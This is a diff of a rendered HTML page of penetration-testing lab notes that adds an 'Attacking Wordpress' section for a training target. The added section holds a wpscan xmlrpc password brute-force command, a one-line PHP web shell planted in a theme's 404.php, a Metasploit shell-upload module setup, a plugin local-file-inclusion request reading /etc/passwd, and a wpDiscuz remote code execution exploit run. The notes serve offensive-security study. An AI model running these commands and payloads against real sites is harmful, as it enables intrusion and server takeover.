@@ -865,11 +865,62 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#wpscan" class="md-nav__link">
+  <a href="#wpscan-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      WPScan
+      WPScan Enumeration
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-wordpress" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Wordpress
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Wordpress">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#login-bruteforce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Login bruteforce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Code execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-wp_admin_shell_upload-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit wp_admin_shell_upload module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-plugin-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerable plugin examples
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -1090,11 +1141,62 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#wpscan" class="md-nav__link">
+  <a href="#wpscan-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
-      WPScan
+      WPScan Enumeration
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-wordpress" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Wordpress
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Wordpress">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#login-bruteforce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Login bruteforce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#code-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Code execution
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-wp_admin_shell_upload-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit wp_admin_shell_upload module
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-plugin-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerable plugin examples
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -1253,7 +1355,12 @@
     - \&lt;Hostname or IP&gt;
 - Post-Exploitation
     - \&lt;Hostname or IP&gt;
-    - \&lt;Hostname or IP&gt;</p>
+    - \&lt;Hostname or IP&gt;
+- Appendix
+    - Exploited systems (hostname/IP and method of exploitation)
+    - Compromised users (account name, method of compromise, account type (local or domain))
+    - Artifacts created on systems
+    - Changes (such as adding a local admin user or modifying group membership)</p>
 <h2 id="wordpress">Wordpress</h2>
 <h3 id="manual-enumeration">Manual Enumeration</h3>
 <ul>
@@ -1282,8 +1389,12 @@
 </li>
 <li>Continue enumaration on other pages i.e: <code>curl -s http://blog.inlanefreight.local/?p=1 | grep plugins</code></li>
 <li>Try some manual enumeration of usernames and/or passwords at the default login page <code>http://blog.inlanefreight.local/wp-login.php</code> (testing for different error messages; correct user wrong password etc)</li>
+<li>Can use <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a> to check for old versions of the site<ul>
+<li>Could discover vulnerable plugins that are no longer used but have not been properly removed</li>
 </ul>
-<h3 id="wpscan">WPScan</h3>
+</li>
+</ul>
+<h3 id="wpscan-enumeration">WPScan Enumeration</h3>
 <ul>
 <li><a href="https://wpvulndb.com/">WPVulnDB</a> to obtain API token
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
@@ -1294,6 +1405,68 @@
 <div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1">sudo<span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://blog.inlanefreight.local<span class="w"> </span>--enumerate<span class="w"> </span>--api-token<span class="w"> </span>dEOFB<span class="se">\&lt;</span>SNIP<span class="se">\&gt;</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Default threads used is 5, change with <code>-t</code> flag.</li>
+</ul>
+<h3 id="attacking-wordpress">Attacking Wordpress</h3>
+<h4 id="login-bruteforce">Login bruteforce</h4>
+<ul>
+<li><a href="https://kinsta.com/blog/xmlrpc-php/"><code>/xmlrpc.php</code></a></li>
+<li>The <code>-U</code> flag will also take a file of usernames or a single username</li>
+<li>Same for the <code>-P</code> flag and passwords</li>
+<li>We can also bruteforce wp-login if xmlrpc isn't available but it is slower
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1">sudo<span class="w"> </span>wpscan<span class="w"> </span>--password-attack<span class="w"> </span>xmlrpc<span class="w"> </span>-t<span class="w"> </span><span class="m">20</span><span class="w"> </span>-U<span class="w"> </span>john<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--url<span class="w"> </span>http://blog.inlanefreight.local
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="code-execution">Code execution</h4>
+<ul>
+<li>With access to admin panel</li>
+<li>Go to Appearence side panel, then theme editor</li>
+<li>Select inactive theme to avoid corrupting the main theme (click select)</li>
+<li>Edit an uncommon page such as <code>404.php</code></li>
+<li>Add below code just below initital comments
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1">system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="m">0</span><span class="o">])</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Click update file to save</li>
+<li>Send commands to the relevant theme page like below:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1">curl<span class="w"> </span>http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0<span class="o">=</span>id
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="metasploit-wp_admin_shell_upload-module">Metasploit <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/">wp_admin_shell_upload</a> module</h4>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1">use<span class="w"> </span>exploit/unix/webapp/wp_admin_shell_upload<span class="w"> </span>
+</span><span id="__span-9-2"><span class="nb">set</span><span class="w"> </span>username<span class="w"> </span>john
+</span><span id="__span-9-3"><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>firebird1
+</span><span id="__span-9-4"><span class="nb">set</span><span class="w"> </span>lhost<span class="w"> </span><span class="m">10</span>.10.14.15<span class="w"> </span>
+</span><span id="__span-9-5"><span class="nb">set</span><span class="w"> </span>rhost<span class="w"> </span><span class="m">10</span>.129.42.195<span class="w">  </span>
+</span><span id="__span-9-6"><span class="nb">set</span><span class="w"> </span>VHOST<span class="w"> </span>blog.inlanefreight.local
+</span><span id="__span-9-7">show<span class="w"> </span>options<span class="w"> </span>
+</span><span id="__span-9-8">exploit
+</span></code></pre></div></td></tr></table></div>
+- Make note of where the shell was uploaded to for later clean up</p>
+<h4 id="vulnerable-plugin-examples">Vulnerable plugin examples</h4>
+<p><strong>mail-masta</strong>
+- Local file inclusion
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl<span class="o">=</span>/etc/passwd
+</span></code></pre></div></td></tr></table></div></p>
+<p><strong>wpDiscuz</strong></p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/49967">WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)</a><ul>
+<li><code>-u</code> URL flag</li>
+<li><code>-p</code> path to a valid post flag  <br />
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1">python3<span class="w"> </span>wp_discuz.py<span class="w"> </span>-u<span class="w"> </span>http://blog.inlanefreight.local<span class="w"> </span>-p<span class="w"> </span>/?p<span class="o">=</span><span class="m">1</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+</li>
+<li>Once webshell uploaded can enter commands within the script</li>
+<li>If commands fail within the script they can be executed with curl using the the upload location shown in the script output</li>
+<li>Example:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd<span class="o">=</span>id
+</span></code></pre></div></td></tr></table></div></li>
 </ul>
 
 
